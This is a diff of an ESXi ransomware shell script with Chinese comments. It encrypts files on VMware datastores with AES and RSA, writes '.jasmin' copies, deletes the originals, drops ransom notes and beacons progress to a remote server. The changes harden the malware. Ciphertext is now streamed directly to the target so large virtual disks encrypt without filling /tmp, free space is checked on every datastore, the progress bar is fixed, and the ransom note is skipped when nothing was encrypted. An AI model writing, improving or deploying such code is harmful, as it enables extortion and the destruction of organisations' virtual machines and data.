@@ -114,17 +114,20 @@ report_fails(){
 # 空间预检
 # ────────────────────────────────────────
 preflight(){
-    NEED=$1
-    DS=""
-    for D in /vmfs/volumes/*; do [ -d "$D" ] && DS="$D" && break; done
-    [ -n "$DS" ] || return 0
-    AVAIL_KB=$(df -k "$DS" 2>/dev/null | awk 'NR==2{print $4}')
-    [ -n "$AVAIL_KB" ] || return 0
-    NEED_KB=$((NEED/1024))
-    if [ "$AVAIL_KB" -lt $((NEED_KB + NEED_KB/20 + 1024)) ]; then
-        log "!!! Preflight warning: $DS has $((AVAIL_KB/1024/1024))GB free < ~$((NEED_KB/1024/1024))GB required"
-        log "!!! Each file needs an equally sized .jasmin copy; insufficient space causes widespread failures"
-    fi
+    # 逐个数据存储检查：一台 ESXi 常挂多个 datastore，只查第一个会漏掉真正会写爆的那个
+    NEED_KB=$((${1:-0}/1024))
+    _any=0
+    for DS in /vmfs/volumes/*; do
+        [ -d "$DS" ] || continue
+        _any=1
+        AVAIL_KB=$(df -k "$DS" 2>/dev/null | awk 'NR==2{print $4}')
+        [ -n "$AVAIL_KB" ] || continue
+        if [ "$AVAIL_KB" -lt $((NEED_KB + NEED_KB/20 + 1024)) ]; then
+            log "!!! Preflight warning: $DS has $((AVAIL_KB/1024/1024))GB free < ~$((NEED_KB/1024/1024))GB required"
+            log "!!! Each file needs an equally sized .jasmin copy; insufficient space causes widespread failures"
+        fi
+    done
+    [ "$_any" = "1" ] || log "!!! Preflight: no datastore found under /vmfs/volumes"
 }
 
 # ────────────────────────────────────────
@@ -142,7 +145,6 @@ encrypt_file(){
     IV_HEX=$(openssl rand -hex 16 2>/dev/null)  || { note_fail "openssl rand 失败(熵源/openssl异常)"; return 1; }
 
     ENC="${FILE}.jasmin"
-    T_CT="/tmp/.jct_$$"
     T_KIV="/tmp/.jkiv_$$"
     T_EK="/tmp/.jek_$$"
     T_HASH="/tmp/.jhash_$$"
@@ -151,13 +153,9 @@ encrypt_file(){
     sha256_file "$FILE" > "$T_HASH" || { note_fail "计算SHA256失败(读取被拒/文件损坏)"; rm -f "$T_HASH"; return 1; }
     [ -s "$T_HASH" ] || { note_fail "SHA256结果为空"; rm -f "$T_HASH"; return 1; }
 
-    # AES-256-CBC 加密（openssl 自动 PKCS7 padding）
-    openssl enc -aes-256-cbc -nosalt -in "$FILE" -out "$T_CT" \
-        -K "$KEY_HEX" -iv "$IV_HEX" 2>/dev/null || { note_fail "AES加密失败(磁盘空间不足/只读/权限)"; rm -f "$T_CT" "$T_HASH"; return 1; }
-
     # key(32B)+iv(16B) 原始二进制（awk hex2bin，替代缺失的 xxd）
     printf '%s%s' "$KEY_HEX" "$IV_HEX" | hex2bin > "$T_KIV" 2>/dev/null
-    [ -s "$T_KIV" ] || { note_fail "key/iv 二进制转换失败(hex2bin)"; rm -f "$T_CT" "$T_KIV" "$T_HASH"; return 1; }
+    [ -s "$T_KIV" ] || { note_fail "key/iv 二进制转换失败(hex2bin)"; rm -f "$T_KIV" "$T_HASH"; return 1; }
 
     # RSA-OAEP 加密 key+iv
     openssl pkeyutl -encrypt -pubin -inkey "$PUBKEY" \
@@ -166,26 +164,34 @@ encrypt_file(){
         -pkeyopt rsa_oaep_md:sha256 \
         -pkeyopt rsa_mgf1_md:sha256 2>/dev/null || {
         note_fail "RSA-OAEP 加密失败(公钥无效或磁盘满)"
-        rm -f "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"
+        rm -f "$T_KIV" "$T_EK" "$T_HASH"
         return 1
     }
 
     EK_LEN=$(wc -c < "$T_EK" 2>/dev/null)
     [ -n "$EK_LEN" ] || EK_LEN=256
 
-    # 组装（重定向失败必须捕获：磁盘满/只读时这里会静默产出空文件）
-    if ! {
-        cat "$T_HASH"
-        cat "$T_CT"
-        cat "$T_EK"
-        dec2le "$EK_LEN"
-    } > "$ENC" 2>/dev/null; then
-        note_fail "写入 .jasmin 失败(磁盘空间不足/只读/权限/inode耗尽)"
-        rm -f "$ENC" "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"
-        return 1
+    # ── 直接组装到目标文件（不再经 /tmp 中转）──
+    # 旧实现把密文先写 /tmp 再 cat 过来。ESXi 的 /tmp 是 RAM disk（通常几十 MB），
+    # 而 VMDK 动辄几十 GB —— 必然写爆 /tmp 并吃光内存，大文件加密就此失败。
+    # 现在：目标文件里先占 32B，密文由 openssl 直接追加（stdout 重定向），最后回填 SHA256。
+    # 全程零额外空间。各步失败都要捕获 —— 磁盘满时重定向会静默产出空文件。
+    _cleanup(){ rm -f "$ENC" "$T_KIV" "$T_EK" "$T_HASH"; }
+    : > "$ENC" 2>/dev/null || { note_fail "写入 .jasmin 失败(磁盘空间不足/只读/权限)"; rm -f "$T_KIV" "$T_EK" "$T_HASH"; return 1; }
+    if ! dd if=/dev/zero bs=32 count=1 >> "$ENC" 2>/dev/null; then
+        note_fail "写入 .jasmin 失败(磁盘空间不足/只读/inode耗尽)"; _cleanup; return 1
+    fi
+    if ! openssl enc -aes-256-cbc -nosalt -in "$FILE" -K "$KEY_HEX" -iv "$IV_HEX" >> "$ENC" 2>/dev/null; then
+        note_fail "AES加密失败(磁盘空间不足/只读/权限)"; _cleanup; return 1
+    fi
+    if ! { cat "$T_EK"; dec2le "$EK_LEN"; } >> "$ENC" 2>/dev/null; then
+        note_fail "写入 .jasmin 失败(磁盘空间不足/只读/inode耗尽)"; _cleanup; return 1
+    fi
+    if ! dd if="$T_HASH" of="$ENC" bs=32 count=1 conv=notrunc 2>/dev/null; then
+        note_fail "回填SHA256失败(磁盘空间不足/只读)"; _cleanup; return 1
     fi
 
-    rm -f "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"
+    rm -f "$T_KIV" "$T_EK" "$T_HASH"
 
     if [ -s "$ENC" ]; then
         rm -f "$FILE"
@@ -219,7 +225,9 @@ draw_bar(){
     if [ -z "$CUR" ]; then CUR="-"; fi
     # 路径截断为固定宽度，避免行长短变化留下残影
     CUR=$(printf '%s' "$CUR" | awk '{ if(length($0)>44) print "..." substr($0,length($0)-40); else print }')
-    printf '\r  [%s] %3d%%  %d/%d  %s/%s  %-46s' \
+    # 末尾 ESC[K 清到行尾：分子分母与字节数位数会变（9/10 -> 100/100），
+    # 仅靠 %-46s 补空格无法覆盖，短行会在终端留下残影
+    printf '\r  [%s] %3d%%  %s/%s  %s/%s  %-46s\033[K' \
         "$BAR" "$PCT" "$N" "$T" "$(fmt_bytes "$CB")" "$(fmt_bytes "$TB")" "$CUR" >&2
 }
 
@@ -313,6 +321,7 @@ main(){
     preflight "$TOTAL_BYTES"    # 空间预检
 
     COUNT=0
+    PROCESSED=0
     SIZE=0
     TYPES=""
     FIRST=1
@@ -343,7 +352,9 @@ main(){
                     esac
                 fi
 
-                PROCESSED=$((COUNT))
+                # 进度用"已处理"而非"已成功"：失败的文件也占用了分母，
+                # 否则有失败时进度条永远走不到 100%
+                PROCESSED=$((PROCESSED+1))
                 draw_bar "$PROCESSED" "$TOTAL" "$SIZE" "$TOTAL_BYTES" "$F"
 
                 # 每8秒回传一次进度
@@ -363,7 +374,12 @@ main(){
     log "Encryption complete: $COUNT/$TOTAL file(s), $(fmt_bytes "$SIZE") / $(fmt_bytes "$TOTAL_BYTES")"
     report_fails    # 失败必须可见，否则无从定位
 
-    drop_notes "$SID" "$NOTE_DIRS"
+    if [ "$TOTAL" -gt 0 ]; then
+        drop_notes "$SID" "$NOTE_DIRS"
+    else
+        # 一个字都没加密却满盘投放勒索信，只会让受害者误判
+        log "Nothing was encrypted - skipped ransom note drop."
+    fi
     rm -f "$NOTE_DIRS"
     beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}" "1" "$TOTAL" "$TOTAL_BYTES"
 }
